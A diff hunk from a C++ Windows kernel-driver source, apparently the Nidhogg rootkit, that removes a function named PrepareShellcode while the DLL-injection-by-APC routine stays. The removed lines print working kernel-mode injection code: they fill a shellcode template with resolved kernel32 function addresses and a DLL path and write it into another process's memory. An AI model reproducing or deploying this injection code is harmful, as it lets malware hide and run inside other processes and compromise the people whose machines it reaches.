@@ -57,47 +57,6 @@ MemoryUtils::~MemoryUtils() {
 
 /*
 * Description:
-* PrepareShellcode is responsible for preparing the shellcode to be injected into the target process.
-*
-* Parameters:
-* @dllPath			-- The name of the DLL to be injected.
-* @shellcodeAddress	-- The address of the allocated shellcode in the remote process.
-* @targetProcess	-- The target process to inject the shellcode into.
-* @pid				-- The process ID of the target process.
-*
-* Returns:
-* @status  [NTSTATUS]		 -- Whether successfuly created the shellcode or not.
-*/
-NTSTATUS MemoryUtils::PrepareShellcode(char* dllPath, PVOID shellcodeAddress, PEPROCESS targetProcess, ULONG pid) {
-	SIZE_T shellcodeSize = SHELLCODE_SIZE;
-	NTSTATUS status = STATUS_SUCCESS;
-	UCHAR newShellcode[SHELLCODE_SIZE] = { 0 };
-
-	PVOID pGetProcAddress = NidhoggMemoryUtils->GetFuncAddress("GetProcAddress", L"\\Windows\\System32\\kernel32.dll", pid);
-	PVOID pGetModuleHandle = NidhoggMemoryUtils->GetFuncAddress("GetModuleHandleA", L"\\Windows\\System32\\kernel32.dll", pid);
-
-	if (!dllPath || !pGetProcAddress || !pGetModuleHandle || !shellcodeAddress)
-		return STATUS_INVALID_PARAMETER;
-
-	memcpy(newShellcode, shellcodeTemplate, SHELLCODE_SIZE);
-	memcpy(newShellcode + GET_MODULE_HANDLE_OFFSET, &pGetModuleHandle, sizeof(pGetModuleHandle));
-	memcpy(newShellcode + GET_PROC_ADDRESS_OFFSET, &pGetProcAddress, sizeof(pGetProcAddress));
-	memcpy(newShellcode + DLL_NAME_OFFSET, dllPath, strlen(dllPath) + 1);
-
-	status = NidhoggMemoryUtils->KeWriteProcessMemory(&newShellcode, targetProcess, shellcodeAddress,
-		shellcodeSize, KernelMode);
-
-	if (!NT_SUCCESS(status))
-		return status;
-	shellcodeSize = SHELLCODE_SIZE;
-	PVOID addr = (char*)shellcodeAddress + DLL_NAME_OFFSET;
-	status = NidhoggMemoryUtils->KeWriteProcessMemory(&addr, targetProcess,
-		(char*)shellcodeAddress + SHELLCODE_ADDRESS_OFFSET, sizeof(PVOID), KernelMode, false);
-	return status;
-}
-
-/*
-* Description:
 * InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
 *
 * Parameters:
